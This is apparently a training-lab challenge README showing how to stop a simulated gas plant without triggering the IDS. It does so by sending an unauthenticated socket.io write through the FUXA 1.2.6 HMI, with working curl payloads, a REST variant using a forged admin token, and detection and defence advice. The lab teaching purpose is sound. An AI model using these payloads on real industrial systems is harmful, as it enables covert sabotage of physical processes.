# Trusted Writer

> **MITRE ATT&CK for ICS:** `Execution` | [T0871 - Execution through API](https://attack.mitre.org/techniques/T0871/) | `Evasion, Impair Process Control` | [T1692.001 - Unauthorized Message: Command Message](https://attack.mitre.org/techniques/T1692/001/)

## Overview

An Intrusion Detection System (IDS) has to decide whose traffic is normal. In
CybICS the HMI, FUXA (`172.18.0.4`), writes to the PLC whenever an operator
presses a button, so the IDS write rules treat it as a **trusted writer**: its
Modbus writes are never counted, however many there are. The same is true of
most firewalls built for a plant like this one: "only the HMI may write to
port 502".

That trust is placed in an address, not in a person. Whoever can make FUXA
write gets the HMI's address for free. In this challenge you stop the plant
without your own host sending the command over Modbus: you ask FUXA, FUXA
asks the PLC, and the IDS sees nothing but the HMI doing its job.

The [IDS Evasion](../ids_evasion/README.md) challenge stays *under* a
threshold. This one goes *around* the rules: there is no threshold to stay
under, because the source is never counted at all.

## Prerequisites

- [HMI Project Recon](../hmi_project_recon/README.md): you need the ID of
  FUXA's `stop` tag and of the device it belongs to.
- Helpful: [Forged HMI Token](../fuxa_jwt/README.md) and
  [IDS Evasion](../ids_evasion/README.md).
- The IDS must be running (dashboard on port 8443).

## Where to run it

From the **attack shell** (WebShell view of the landing page, `172.18.0.100`)
or the Kali attack machine (VNC on port 6081, which has a browser). The IDS
runs on the host, so from the attack shell it is at `http://172.18.0.1:8443`
(`$DEVICE_IP`), not `localhost`. Everything below needs only `curl` and
Python's standard library.

## Task

The flag has the format `CybICS(flag)`. Stop the plant so that

- the newest write of the stop flag the IDS saw came **from FUXA**
  (`172.18.0.4`), not from your host;
- the IDS raised **no alert** from one minute before that write until you
  verify (ARP noise from restarted containers does not count), and nobody
  cleared its alert log in that time;
- the plant is **still stopped** when you click **Verify** on the challenge
  page, at most five minutes after the write.

Then restore the plant the same way.

### Background: the IDS write journal

Besides its alerts, the IDS keeps a journal of every Modbus write request it
sees: who sent it, to which address, with which values. It is not a rule and
never raises an alert, but it is the evidence a defender would look at, and it
is what Verify reads:

```bash
curl -s http://$DEVICE_IP:8443/api/modbus/writes
```

FUXA's writes appear there with `"service": "fuxa"`. The rules ignore them;
the journal does not.

### Steps

1. **Find the target.** From your HMI Project Recon notes, or again from the
   project FUXA serves without a login:
   ```bash
   curl -s http://172.18.0.4:1881/api/project | python3 -c '
   import json, sys
   for dev_id, dev in json.load(sys.stdin)["devices"].items():
       for tag in (dev.get("tags") or {}).values():
           if tag["name"] in ("stop", "manual"):
               print(dev_id, dev["name"], tag["id"], tag["name"], tag["address"])'
   ```
   Note the device ID of `OpenPLC` and the tag ID of `stop`. FUXA's address
   1129 is holding register **1128** on the wire, the PLC's stop flag: any
   value other than 0 stops the compressor and closes the system valve. You
   can read the tag through FUXA too, still without a login:
   ```bash
   curl -s "http://172.18.0.4:1881/api/getTagValue?ids=%5B%22<stop tag id>%22%5D"
   ```

2. **Look at what the IDS trusts.** Open the dashboard's Rules tab: the
   Modbus write rules name the services they skip. Then see how your own host
   shows up in the journal. Write a 0 to the stop flag directly; it is 0
   already, so nothing changes, and a single write is far below every
   threshold:
   ```bash
   python3 -c "
   from pymodbus.client import ModbusTcpClient
   c = ModbusTcpClient('172.18.0.3', port=502); c.connect()
   c.write_register(1128, 0); c.close()"
   curl -s http://$DEVICE_IP:8443/api/modbus/writes | python3 -m json.tool | tail -15
   ```
   The newest entry names your address. A defender reading the journal sees
   immediately that a host that is not the HMI wrote the stop flag. This is
   the trace you are going to avoid.

3. **Learn how the HMI asks.** On the Kali attack machine, open the HMI
   (`http://172.18.0.4:1881`) in the browser without logging in, open the
   developer tools (F12), Network tab, and select the `socket.io` WebSocket
   connection. The frames are socket.io events: text that starts with `42`
   followed by a JSON array `["<event name>", <data>]`. The page keeps
   exchanging `device-values` events with FUXA; that is how it gets the live
   values.

   The STOP button is greyed out for a guest, so the browser will not show you
   a write. FUXA is open source, though: in `frangoteam/FUXA` on GitHub, switch to the tag `v1.2.6` (the
   version CybICS runs; the current code has changed here), open
   `server/runtime/index.js` and find the handler for `device-values`
   (`Events.IoEventTypes.DEVICE_VALUES`). Which message makes it call
   `devices.setDeviceValue`, and which fields does it pass on? Compare with
   the `connection` handler a few lines above it: what happens to a client
   that sends no token, and does the `device-values` handler check anything
   before it writes?

   That is the whole hole: the greyed-out button is the browser's decision,
   not the server's. An operator who presses STOP sends the same message, and
   the Modbus write that follows goes from FUXA to the PLC either way.

4. **Ask FUXA to stop the plant.** You do not need a browser to send that
   message. FUXA 1.2.6 bundles socket.io 2 (Engine.IO protocol 3), which also
   works over plain HTTP "long polling": a GET opens a session and returns its
   `sid`, a POST sends packets framed as `<length>:<packet>`.
   ```bash
   FUXA=http://172.18.0.4:1881
   SID=$(curl -s "$FUXA/socket.io/?EIO=3&transport=polling" | grep -o '"sid":"[^"]*"' | cut -d'"' -f4)
   MSG='42["device-values",{"cmd":"set","var":{"source":"<device id>","id":"<stop tag id>","value":1}}]'
   curl -s -H 'Content-Type: text/plain;charset=UTF-8' --data-binary "${#MSG}:$MSG" \
        "$FUXA/socket.io/?EIO=3&transport=polling&sid=$SID"
   ```
   FUXA answers `ok`. A second later the stop tag reads 1, and the HMI shows
   the plant as stopped.

   **The REST route.** FUXA also has `POST /api/setTagValue` for scripts and
   other systems. It needs an **administrator** token in the
   `x-access-token` header; an operator or viewer token gets `401`. If you
   solved [Forged HMI Token](../fuxa_jwt/README.md), your forged token works:
   ```bash
   curl -s -X POST -H 'Content-Type: application/json' -H 'x-access-token: <admin token>' \
        -d '{"tags":[{"id":"<stop tag id>","value":1}]}' $FUXA/api/setTagValue
   ```
   A single login with known administrator credentials works too. Guessing
   them does not: the IDS rule `http_brute_force` fires after five login
   attempts within 30 seconds, and the challenge requires a silent IDS.

5. **Check what the IDS saw.**
   ```bash
   curl -s http://$DEVICE_IP:8443/api/modbus/writes | python3 -m json.tool | tail -15
   curl -s http://$DEVICE_IP:8443/api/alerts | python3 -m json.tool | tail -20
   ```
   The newest write of address 1128 now comes from `172.18.0.4`, service
   `fuxa`, value 1. No new alert. To the IDS this is the HMI doing exactly
   what an HMI does.

6. **Verify** on the challenge page while the plant is still stopped.

7. **Restore the plant.** Send the same message with `"value":0` and check
   that the compressor runs again.

`trusted_writer.py` in this folder does steps 1, 4 and 5 for you
(`python3 trusted_writer.py --help`; `--value 0` restores).

## What Verify can and cannot tell

Verify reads the IDS write journal and alert log, and the stop flag from the
PLC. It cannot tell whether FUXA wrote because of your script or because
someone pressed STOP in the HMI, and neither can the IDS: both produce the
same Modbus request from the same address. That is the whole problem. A
network sensor that trusts a source cannot see the intent behind that
source's traffic; only the HMI could, and FUXA 1.2.6 does not record tag
writes in its own log either (it logs `setValue` only with `logFull` on).

## Detect and defend

- **Detection.**
  - *Watch what the trusted writer does, not only who it is.* The journal
    shows every write FUXA made. A rule that alerts on a write to a
    safety-critical register, such as the stop flag, whatever the source,
    would have fired here. It costs little: FUXA writes only when someone
    operates the HMI.
  - *Correlate with the operator.* A stop the HMI sent while no operator was
    logged in, or from a client the control room does not have, is
    suspicious. That information exists only on the HMI, so its logs belong
    in the monitoring too. FUXA 1.2.6 logs a tag write only with `logFull`
    on; its container log (`docker logs`) lists every successful HTTP request,
    including `POST /api/setTagValue` and the socket.io polling requests,
    while `_logs/api.log` keeps only failed ones.
  - *Watch who talks to the HMI.* The attack machine opening socket.io
    sessions to port 1881 is the trace this attack leaves on the network.
- **Defence.**
  - *Restrict who can reach the HMI's server.* Port 1881 should answer only
    the operator stations, not every host in the plant network. That closes
    the guest socket.io route and the REST route at once.
  - *Require authentication for every write path.* FUXA's buttons can be
    limited to user groups, but in 1.2.6 that only hides or disables them in
    the browser; the socket.io handler writes for anyone. That is a flaw in
    FUXA's code, not in its settings. Newer FUXA code checks write
    authorization in that handler (`isSocketWriteAuthorized` on the main
    branch), so an upgrade is the fix; test it against the version you
    deploy. Until then the network rule above is the mitigation.
  - *Protect the REST route.* `setTagValue` needs an administrator token, so
    the [FUXA password](../defense_password/README.md) and the
    [token key](../defense_fuxa_jwt/README.md) defences matter here, but they
    do not close the socket.io route.
  - *Interlocks in the PLC.* An HMI should not be able to drive the process
    into an unsafe state at all; safety-relevant limits belong in the PLC
    program or a separate safety system, not in the HMI.

## Security Framework References

<details>
  <summary>Click to expand</summary>

### MITRE ATT&CK for ICS

| Tactic | Technique | ID | Description |
|--------|-----------|-----|-------------|
| Execution | Execution through API | [T0871](https://attack.mitre.org/techniques/T0871/) | Using FUXA's socket.io and REST interfaces to make it write a PLC tag |
| Evasion, Impair Process Control | Unauthorized Message: Command Message | [T1692.001](https://attack.mitre.org/techniques/T1692/001/) | The stop command reaches the PLC from the trusted HMI, which no IDS rule counts |
| Impact | Manipulation of Control | [T0831](https://attack.mitre.org/techniques/T0831/) | Setting the PLC's stop flag |
| Impact | Loss of Availability | [T0826](https://attack.mitre.org/techniques/T0826/) | The gas plant stops until it is restored |

**Why this matters:** In the 2015 attack on Ukrainian distribution companies,
the attackers did not send a single forged protocol packet to open the
breakers. They took over the operators' own HMI workstations and clicked. To
every system downstream, the commands came from the right place.

### MITRE D3FEND - Defensive Countermeasures

| Technique | ID | Description |
|-----------|-----|-------------|
| Network Traffic Analysis | [D3-NTA](https://d3fend.mitre.org/technique/d3f:NetworkTrafficAnalysis/) | Recording what a trusted writer writes, not only whether it is trusted |
| Inbound Traffic Filtering | [D3-ITF](https://d3fend.mitre.org/technique/d3f:InboundTrafficFiltering/) | Letting only operator stations reach the HMI server on port 1881 |
| Web Session Activity Analysis | [D3-WSAA](https://d3fend.mitre.org/technique/d3f:WebSessionActivityAnalysis/) | Spotting HMI sessions that write without an operator behind them |

### NIST SP 800-82r3 Reference

| Control Family | Controls | Relevance |
|----------------|----------|-----------|
| **Access Control (AC)** | AC-3, AC-6 | Enforce authorization on every write path, least privilege for HMI clients |
| **System and Communications Protection (SC)** | SC-7 | Boundary protection around the HMI server |
| **System and Information Integrity (SI)** | SI-4 | Monitor the trusted writer's commands, not only untrusted sources |
| **Audit and Accountability (AU)** | AU-2, AU-12 | Log operator commands on the HMI |

**Why NIST 800-82r3 matters here:** an allowlist of sources is a boundary
control (SC-7), not an authorization control (AC-3). 800-82r3 asks for both,
and for monitoring (SI-4) that does not stop at the boundary.

</details>

## Hints

- FUXA answers `400 Bad Request` or nothing? Socket.io POSTs need the length
  prefix to match the packet exactly, and a fresh `sid` from the GET.
- `setTagValue` says `Unauthorized`? Your token is not an administrator's.
  Use the socket.io route, or the token from Forged HMI Token.
- Verify says the newest write came from your host? Something wrote the stop
  flag directly after FUXA did. Stop the plant through FUXA once more.
- Verify lists alerts? Wait a minute without scans or login guessing, then
  send the stop again.

## Solution

<details>
  <summary>Click to expand</summary>

```bash
python3 trusted_writer.py --ids-url http://172.18.0.1:8443   # stop, as a guest
# click Verify
python3 trusted_writer.py --value 0                          # restore
```

The script reads FUXA's project, finds the `stop` tag (ID
`t_8d116167-9c4d477a` on device `d_ce5e29f3-e7a14f6e`, wire address 1128),
opens a socket.io polling session and sends
`42["device-values",{"cmd":"set","var":{"source":"d_ce5e29f3-e7a14f6e","id":"t_8d116167-9c4d477a","value":1}}]`.
FUXA writes function code 06, register 1128, value 1 to OpenPLC from
`172.18.0.4`. `--route rest --token <admin token>` uses `setTagValue`
instead.

</details>
